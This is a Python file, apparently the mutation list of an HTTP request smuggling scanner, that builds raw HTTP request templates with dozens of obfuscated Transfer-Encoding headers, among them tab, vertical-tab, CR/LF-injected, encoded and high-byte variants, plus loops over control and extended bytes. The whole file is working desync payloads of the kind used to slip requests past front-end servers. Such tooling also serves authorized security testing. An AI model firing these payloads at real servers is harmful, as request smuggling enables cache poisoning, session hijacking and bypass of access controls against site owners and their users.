
def render_template(gadget):
	RN = "\r\n"
	p = Payload()
	p.header  = "__METHOD__ __ENDPOINT__?cb=__RANDOM__ HTTP/1.1" + RN
	p.header += gadget + RN
	p.header += "Host: __HOST__" + RN
	p.header += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36" + RN
	p.header += "Content-type: application/x-www-form-urlencoded; charset=UTF-8" + RN
	p.header += "Content-Length: __REPLACE_CL__" + RN
	return p

mutations["nameprefix1"] = render_template(" Transfer-Encoding: chunked")
mutations["tabprefix1"] = render_template("Transfer-Encoding:\tchunked")
mutations["tabprefix2"] = render_template("Transfer-Encoding\t:\tchunked")
mutations["spacejoin1"] = render_template("Transfer Encoding: chunked")
mutations["underjoin1"] = render_template("Transfer_Encoding: chunked")
mutations["smashed"] = render_template("Transfer Encoding:chunked")
mutations["space1"] = render_template("Transfer-Encoding : chunked")
mutations["valueprefix1"] = render_template("Transfer-Encoding:  chunked")
mutations["vertprefix1"] = render_template("Transfer-Encoding:\u000Bchunked")
mutations["commaCow"] = render_template("Transfer-Encoding: chunked, cow")
mutations["cowComma"] = render_template("Transfer-Encoding: cow, chunked")
mutations["contentEnc"] = render_template("Content-Encoding: chunked")
mutations["linewrapped1"] = render_template("Transfer-Encoding:\n chunked")
mutations["quoted"] = render_template("Transfer-Encoding: \"chunked\"")
mutations["aposed"] = render_template("Transfer-Encoding: 'chunked'")
mutations["lazygrep"] = render_template("Transfer-Encoding: chunk")
mutations["sarcasm"] = render_template("TrAnSFer-EnCODinG: cHuNkeD")
mutations["yelling"] = render_template("TRANSFER-ENCODING: CHUNKED")
mutations["0dsuffix"] = render_template("Transfer-Encoding: chunked\r")
mutations["tabsuffix"] = render_template("Transfer-Encoding: chunked\t")
mutations["revdualchunk"] = render_template("Transfer-Encoding: cow\r\nTransfer-Encoding: chunked")
mutations["0dspam"] = render_template("Transfer\r-Encoding: chunked")
mutations["nested"] = render_template("Transfer-Encoding: cow chunked bar")
mutations["spaceFF"] = render_template("Transfer-Encoding:\xFFchunked")
mutations["accentCH"] = render_template("Transfer-Encoding: ch\x96nked")
mutations["accentTE"] = render_template("Transf\x82r-Encoding: chunked")
mutations["x-rout"] = render_template("X:X\rTransfer-Encoding: chunked")
mutations["x-nout"] = render_template("X:X\nTransfer-Encoding: chunked")

mutations["vanilla"] = render_template("Transfer-Encoding: chunked")
mutations["nameprefix2"] = render_template("Foo: bar\r\n\tTransfer-Encoding: chunked")
mutations["nospace1"] = render_template("Transfer-Encoding:chunked")
mutations["vertwrap"] = render_template("Transfer-Encoding: chunked\n\x0B")
mutations["connection"] = render_template("Connection: Transfer-Encoding\r\nTransfer-Encoding: chunked")
mutations["spjunk"] = render_template("Transfer-Encoding x: chunked")
mutations["backslash"] = render_template("Transfer\\Encoding: chunked")
mutations["nel"] = render_template("Transfer-Encoding\x85: chunked")
mutations["nbsp"] = render_template("Transfer-Encoding\xA0: chunked")
mutations["shy"] = render_template("Transfer\xADEncoding: chunked")
mutations["shy2"] = render_template("Transfer-Encoding\xAD: chunked")
mutations["doublewrapped"] = render_template("Transfer-Encoding:\r\n \r\n chunked")
mutations["gareth1"] = render_template("Transfer-Encoding\n : chunked")
mutations["badsetupCR"] = render_template("Foo: bar\rTransfer-Encoding: chunked")
mutations["badsetupLF"] = render_template("Foo: bar\nTransfer-Encoding: chunked")
mutations["multiCase"] = render_template("tRANSFER-eNCODING: chunked")
mutations["0dwrap"] = render_template("Foo: bar\r\n\rTransfer-Encoding: chunked")
mutations["tabwrap"] = render_template("Transfer-Encoding: chunked\r\n\t")
mutations["bodysplit"] = render_template("Foo: bar\n\nTransfer-Encoding: chunked")
def render_template_http10(gadget):
	RN = "\r\n"
	p = Payload()
	p.header  = "__METHOD__ __ENDPOINT__?cb=__RANDOM__ HTTP/1.0" + RN
	p.header += gadget + RN
	p.header += "Host: __HOST__" + RN
	p.header += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36" + RN
	p.header += "Content-type: application/x-www-form-urlencoded; charset=UTF-8" + RN
	p.header += "Content-Length: __REPLACE_CL__" + RN
	return p
mutations["http1.0"] = render_template_http10("Transfer-Encoding: chunked")
mutations["encode"] = render_template("Transfer-%45ncoding: chunked")
mutations["qencode"] = render_template("Transfer-Encoding: =?iso-8859-1?B?Y2h1bmtlZA==?=")
mutations["qencodeutf"] = render_template("Transfer-Encoding: =?UTF-8?B?Y2h1bmtlZA==?=")
mutations["dualchunk"] = render_template("Transfer-Encoding: chunked\r\nTransfer-encoding: identity")
mutations["commaCowIdentity"] = render_template("Transfer-Encoding: chunked, identity")
mutations["cowCommaIdentity"] = render_template("Transfer-Encoding: identity, chunked")
mutations["nestedIdentity"] = render_template("Transfer-Encoding: identity, chunked, identity")
mutations["unispace"] = render_template("Transfer-Encoding:\xA0chunked")

for i in range(0x1,0x20):
	mutations["midspace-%02x"%i] = render_template("Transfer-Encoding:%cchunked"%(i))
	mutations["postspace-%02x"%i] = render_template("Transfer-Encoding%c: chunked"%(i))
	mutations["prespace-%02x"%i] = render_template("%cTransfer-Encoding: chunked"%(i))
	mutations["endspace-%02x"%i] = render_template("Transfer-Encoding: chunked%c"%(i))
	
for i in range(0x7F,0x100):
	mutations["midspace-%02x"%i] = render_template("Transfer-Encoding:%cchunked"%(i))
	mutations["postspace-%02x"%i] = render_template("Transfer-Encoding%c: chunked"%(i))
	mutations["prespace-%02x"%i] = render_template("%cTransfer-Encoding: chunked"%(i))
	mutations["endspace-%02x"%i] = render_template("Transfer-Encoding: chunked%c"%(i))
	
